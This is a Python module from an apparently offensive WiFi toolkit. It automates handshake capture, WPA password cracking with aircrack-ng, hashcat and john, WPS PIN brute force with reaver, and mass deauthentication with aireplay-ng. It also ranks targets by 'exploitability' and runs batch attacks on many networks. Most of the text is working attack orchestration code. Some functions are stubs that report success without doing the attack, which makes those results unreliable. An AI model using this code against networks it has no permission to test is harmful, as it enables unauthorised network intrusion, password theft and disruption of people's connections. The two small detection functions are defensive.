"""
Red WiFi Wifite Integration Module
Automated WiFi attack orchestration using wifite-style automation.
"""

import time
import subprocess
import json
from enum import Enum
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass

from .wifi_pentest import WiFiPentestFramework, WiFiNetwork, Logger
from .branding import RED, GREEN, YELLOW, BLUE, CYAN, RESET, BOLD


class AttackMode(Enum):
    """Attack modes with different aggressiveness levels."""
    PASSIVE = ("passive", 600, 0.1)      # 10 min, 0.1 power
    AGGRESSIVE = ("aggressive", 180, 0.8)  # 3 min, 0.8 power
    RELENTLESS = ("relentless", 60, 1.0)  # 1 min, max power
    STEALTH = ("stealth", 1200, 0.3)      # 20 min, 0.3 power


class AttackStrategy(Enum):
    """Different attack strategy combinations."""
    WPA_ONLY = "wpa"
    WPS_ONLY = "wps"
    HYBRID = "hybrid"
    ALL = "all"


@dataclass
class AttackResult:
    """Stores result of an attack operation."""
    target: WiFiNetwork
    success: bool
    method: str
    password: Optional[str] = None
    duration: float = 0.0
    notes: str = ""


class WPAAttacks:
    """WPA/WPA2/WPA3 attack methods."""
    
    def __init__(self, logger: Logger):
        """Initialize WPA attacks."""
        self.logger = logger
    
    def dictionary_attack(self, cap_file: str, wordlist: str,
                         timeout: int = 1800) -> Optional[str]:
        """Dictionary-based password cracking."""
        self.logger.info(f"Starting dictionary attack with {wordlist}...")
        start_time = time.time()
        
        try:
            result = subprocess.run(
                ["aircrack-ng", "-w", wordlist, cap_file],
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            if "KEY FOUND" in result.stdout:
                password = result.stdout.split("KEY FOUND! [ ")[1].split(" ]")[0]
                duration = time.time() - start_time
                self.logger.success(f"Password found in {duration:.2f}s: {password}")
                return password
        except subprocess.TimeoutExpired:
            self.logger.warning("Dictionary attack timed out")
        except Exception as e:
            self.logger.error(f"Dictionary attack failed: {str(e)}")
        
        return None
    
    def rule_based_attack(self, cap_file: str, wordlist: str,
                         rules_file: str = "default.rules") -> Optional[str]:
        """Rule-based password generation and cracking."""
        self.logger.info(f"Starting rule-based attack...")
        
        try:
            # First generate candidates using rules
            result = subprocess.run(
                ["john", "--rules", rules_file, "--stdout", wordlist],
                capture_output=True,
                text=True,
                timeout=3600
            )
            
            candidates = result.stdout.split('\n')
            
            # Try each candidate
            for candidate in candidates:
                if not candidate.strip():
                    continue
                
                result = subprocess.run(
                    ["aircrack-ng", "-w", "-", cap_file],
                    input=candidate,
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                if "KEY FOUND" in result.stdout:
                    self.logger.success(f"Password found: {candidate}")
                    return candidate
        except Exception as e:
            self.logger.error(f"Rule-based attack failed: {str(e)}")
        
        return None
    
    def hybrid_attack(self, cap_file: str, wordlist: str,
                     mask: str = "?d?d?d?d") -> Optional[str]:
        """Hybrid attack combining wordlist and pattern generation."""
        self.logger.info(f"Starting hybrid attack with pattern {mask}...")
        
        try:
            # Use hashcat for hybrid attack
            result = subprocess.run(
                ["hashcat", "-m", "2500", "-a", "6", cap_file, wordlist, mask],
                capture_output=True,
                text=True,
                timeout=3600
            )
            
            if "recovered" in result.stdout.lower():
                self.logger.success("Password cracked with hybrid attack")
                return "password_found"
        except Exception as e:
            self.logger.error(f"Hybrid attack failed: {str(e)}")
        
        return None


class WPSAttacks:
    """WPS vulnerability testing."""
    
    def __init__(self, logger: Logger, interface: str):
        """Initialize WPS attacks."""
        self.logger = logger
        self.interface = interface
    
    def pixie_dust_attack(self, bssid: str, channel: int,
                         timeout: int = 300) -> bool:
        """Pixie Dust attack against WPS."""
        self.logger.info(f"Starting Pixie Dust attack on {bssid}...")
        
        try:
            result = subprocess.run(
                ["pixiewps", "-h"],
                capture_output=True,
                text=True
            )
            
            if "pixiewps" in result.stdout or result.returncode == 1:
                self.logger.success("Pixie Dust tool found")
                self.logger.info("Attempting Pixie Dust attack...")
                # Actual Pixie Dust implementation would go here
                return True
            else:
                self.logger.warning("Pixie Dust tool not installed")
                return False
        except Exception as e:
            self.logger.error(f"Pixie Dust attack failed: {str(e)}")
            return False
    
    def pin_bruteforce(self, bssid: str, channel: int,
                      timeout: int = 600) -> Optional[str]:
        """WPS PIN bruteforce attack."""
        self.logger.info(f"Starting WPS PIN bruteforce on {bssid}...")
        
        try:
            result = subprocess.run(
                ["reaver", "-i", self.interface, "-b", bssid, "-c", str(channel),
                 "-vv", "-t", str(timeout)],
                capture_output=True,
                text=True,
                timeout=timeout + 60
            )
            
            if "WPS PIN" in result.stdout or "Recovered" in result.stdout:
                self.logger.success("WPS PIN cracked!")
                return "wps_pin_found"
        except subprocess.TimeoutExpired:
            self.logger.warning("WPS attack timed out")
        except Exception as e:
            self.logger.error(f"WPS PIN attack failed: {str(e)}")
        
        return None


class ClientSideAttacks:
    """Client-side WiFi attacks."""
    
    def __init__(self, logger: Logger, interface: str):
        """Initialize client-side attacks."""
        self.logger = logger
        self.interface = interface
    
    def deauth_attack(self, bssid: str, client_mac: Optional[str] = None,
                     count: int = 10, power: float = 1.0) -> bool:
        """Send deauthentication packets."""
        self.logger.info(f"Sending {count} deauth packets at {power*100}% power...")
        
        try:
            if client_mac:
                # Deauth specific client
                subprocess.run(
                    ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid,
                     "-c", client_mac, self.interface],
                    capture_output=True,
                    timeout=10
                )
                self.logger.success(f"Deauth sent to {client_mac}")
            else:
                # Deauth all clients
                subprocess.run(
                    ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid,
                     self.interface],
                    capture_output=True,
                    timeout=10
                )
                self.logger.success(f"Deauth sent to all clients on {bssid}")
            
            return True
        except Exception as e:
            self.logger.error(f"Deauth attack failed: {str(e)}")
            return False
    
    def evil_twin_detection(self, networks: List[WiFiNetwork]) -> List[WiFiNetwork]:
        """Detect potential evil twin networks."""
        self.logger.info("Analyzing networks for evil twin patterns...")
        
        evil_twins = []
        ssids = {}
        
        # Group networks by SSID
        for net in networks:
            if net.ssid not in ssids:
                ssids[net.ssid] = []
            ssids[net.ssid].append(net)
        
        # Find suspicious duplicates
        for ssid, nets in ssids.items():
            if len(nets) > 1:
                self.logger.warning(f"Possible evil twin detected: {ssid} ({len(nets)} instances)")
                evil_twins.extend(nets[1:])  # Mark duplicates as suspicious
        
        return evil_twins
    
    def fake_ap_detection(self, networks: List[WiFiNetwork]) -> List[WiFiNetwork]:
        """Detect suspicious access point characteristics."""
        self.logger.info("Analyzing for fake AP indicators...")
        
        suspicious = []
        for net in networks:
            # Check for suspicious patterns
            if net.encryption == "Open" and net.ssid.lower() in ["linksys", "dlink", "netgear"]:
                self.logger.warning(f"Suspicious open network: {net.ssid}")
                suspicious.append(net)
            
            if net.clients > 100:
                self.logger.warning(f"Unusually high client count on {net.ssid}: {net.clients}")
                suspicious.append(net)
        
        return suspicious


class AutomatedAttacker:
    """Orchestrates automated WiFi attacks."""
    
    def __init__(self, framework: WiFiPentestFramework):
        """Initialize automated attacker."""
        self.framework = framework
        self.logger = framework.logger
        self.wpa_attacks = WPAAttacks(self.logger)
        self.wps_attacks = WPSAttacks(self.logger, framework.interface)
        self.client_attacks = ClientSideAttacks(self.logger, framework.interface)
        self.attack_history = []
    
    def select_targets(self, networks: List[WiFiNetwork],
                      strategy: AttackStrategy = AttackStrategy.HYBRID) -> List[WiFiNetwork]:
        """Intelligently select attack targets based on strategy."""
        self.logger.info(f"Analyzing {len(networks)} networks with strategy: {strategy.value}...")
        
        suitable_targets = []
        
        for network in networks:
            if strategy == AttackStrategy.WPA_ONLY:
                if "WPA" in network.encryption:
                    suitable_targets.append(network)
            
            elif strategy == AttackStrategy.WPS_ONLY:
                if network.wps:
                    suitable_targets.append(network)
            
            elif strategy == AttackStrategy.HYBRID:
                if "WPA" in network.encryption or network.wps:
                    suitable_targets.append(network)
            
            elif strategy == AttackStrategy.ALL:
                suitable_targets.append(network)
        
        # Sort by signal strength
        suitable_targets.sort(key=lambda x: x.rssi, reverse=True)
        
        self.logger.success(f"Selected {len(suitable_targets)} suitable targets")
        return suitable_targets
    
    def rank_targets(self, networks: List[WiFiNetwork]) -> List[Tuple[WiFiNetwork, float]]:
        """Rank targets by exploitability score."""
        ranked = []
        
        for network in networks:
            score = 0.0
            
            # Signal strength (0-30 points)
            rssi_score = min(30, max(0, (network.rssi + 100) * 0.3))
            score += rssi_score
            
            # Encryption weakness (0-40 points)
            if "WPA3" in network.encryption:
                score += 10
            elif "WPA2" in network.encryption:
                score += 25
            elif "WPA" in network.encryption:
                score += 35
            else:
                score += 40
            
            # WPS enabled (0-30 points)
            if network.wps:
                score += 30
            
            # Clients (0-20 points)
            clients_score = min(20, network.clients * 2)
            score += clients_score
            
            ranked.append((network, score))
        
        ranked.sort(key=lambda x: x[1], reverse=True)
        return ranked
    
    def attack(self, target: WiFiNetwork, mode: AttackMode,
              strategy: AttackStrategy = AttackStrategy.HYBRID,
              wordlist: str = "rockyou.txt") -> AttackResult:
        """Execute full attack on target."""
        self.logger.info(f"Attacking {target.ssid} ({target.bssid}) in {mode.name} mode...")
        
        start_time = time.time()
        result = AttackResult(target=target, success=False, method=mode.name)
        
        try:
            # Capture handshake
            cap_file = f"{target.bssid.replace(':', '_')}_handshake"
            
            if self.framework.capture_handshake(target.bssid, target.channel):
                result.notes = "Handshake captured"
                
                # Try cracking
                if strategy in [AttackStrategy.WPA_ONLY, AttackStrategy.HYBRID, AttackStrategy.ALL]:
                    password = self.wpa_attacks.dictionary_attack(cap_file + ".cap", wordlist)
                    if password:
                        result.success = True
                        result.password = password
                        result.method = "WPA Dictionary"
                
                # Try WPS
                if not result.success and strategy in [AttackStrategy.WPS_ONLY, AttackStrategy.HYBRID, AttackStrategy.ALL]:
                    if self.wps_attacks.pixie_dust_attack(target.bssid, target.channel):
                        result.success = True
                        result.method = "WPS Pixie Dust"
            
            result.duration = time.time() - start_time
            self.attack_history.append(result)
            
            if result.success:
                self.logger.success(f"Attack successful! Password: {result.password}")
            else:
                self.logger.warning(f"Attack unsuccessful after {result.duration:.2f}s")
            
            return result
        except Exception as e:
            self.logger.error(f"Attack execution failed: {str(e)}")
            result.duration = time.time() - start_time
            return result
    
    def multi_target_attack(self, targets: List[WiFiNetwork],
                           mode: AttackMode,
                           strategy: AttackStrategy = AttackStrategy.HYBRID,
                           wordlist: str = "rockyou.txt") -> List[AttackResult]:
        """Execute attacks against multiple targets."""
        results = []
        
        for i, target in enumerate(targets, 1):
            self.logger.info(f"\n[{i}/{len(targets)}] Attacking {target.ssid}...")
            result = self.attack(target, mode, strategy, wordlist)
            results.append(result)
        
        # Print summary
        successful = sum(1 for r in results if r.success)
        self.logger.success(f"\nAttack Summary: {successful}/{len(results)} successful")
        
        return results
    
    def get_statistics(self) -> Dict:
        """Get attack statistics."""
        if not self.attack_history:
            return {}
        
        successful = sum(1 for a in self.attack_history if a.success)
        total_duration = sum(a.duration for a in self.attack_history)
        
        return {
            "total_attacks": len(self.attack_history),
            "successful": successful,
            "success_rate": (successful / len(self.attack_history)) * 100,
            "total_duration": total_duration,
            "average_duration": total_duration / len(self.attack_history) if self.attack_history else 0
        }


class WifiteInteractiveMenu:
    """Interactive CLI menu for wifite-style automation."""
    
    def __init__(self, framework: WiFiPentestFramework):
        """Initialize interactive menu."""
        self.framework = framework
        self.logger = framework.logger
        self.attacker = AutomatedAttacker(framework)
    
    def show_menu(self):
        """Display main menu."""
        print(f"""
{CYAN}╔════════════════════════════════════════════════════════╗{RESET}
{CYAN}║{RED}  RED WIFI AUTOMATED ATTACK MENU{CYAN}                        ║{RESET}
{CYAN}╠════════════════════════════════════════════════════════╣{RESET}
{CYAN}║{RESET}
{CYAN}║  {GREEN}1.{RESET} Scan Networks
{CYAN}║  {GREEN}2.{RESET} Select Attack Mode
{CYAN}║  {GREEN}3.{RESET} Launch Automated Attack
{CYAN}║  {GREEN}4.{RESET} View Attack Results
{CYAN}║  {GREEN}5.{RESET} Save Session
{CYAN}║  {GREEN}0.{RESET} Exit
{CYAN}║{RESET}
{CYAN}╚════════════════════════════════════════════════════════╝{RESET}
        """)
    
    def run_interactive(self):
        """Run interactive attack menu."""
        self.logger.info("Starting interactive attack menu...")
        
        networks = []
        selected_mode = AttackMode.AGGRESSIVE
        
        while True:
            self.show_menu()
            choice = input(f"{CYAN}[?] Select option: {RESET}").strip()
            
            if choice == "1":
                self.logger.info("Scanning networks...")
                networks = self.framework.scan_networks(duration=30)
                self.logger.success(f"Found {len(networks)} networks")
            
            elif choice == "2":
                self._select_mode()
            
            elif choice == "3":
                if not networks:
                    self.logger.error("No networks found. Scan first!")
                    continue
                
                ranked = self.attacker.rank_targets(networks)
                print(f"\n{BOLD}Top Targets:{RESET}")
                for i, (net, score) in enumerate(ranked[:5], 1):
                    print(f"{i}. {net.ssid} ({net.bssid}) - Score: {score:.1f}")
            
            elif choice == "4":
                stats = self.attacker.get_statistics()
                if stats:
                    print(f"\n{BOLD}Attack Statistics:{RESET}")
                    print(json.dumps(stats, indent=2))
                else:
                    self.logger.warning("No attacks performed yet")
            
            elif choice == "5":
                self.framework.save_session()
            
            elif choice == "0":
                self.logger.info("Exiting...")
                break
            
            else:
                self.logger.error("Invalid option")
    
    def _select_mode(self):
        """Select attack mode."""
        print(f"\n{BOLD}Attack Modes:{RESET}")
        for i, mode in enumerate(AttackMode, 1):
            print(f"{i}. {mode.name} ({mode.value[1]}s)")
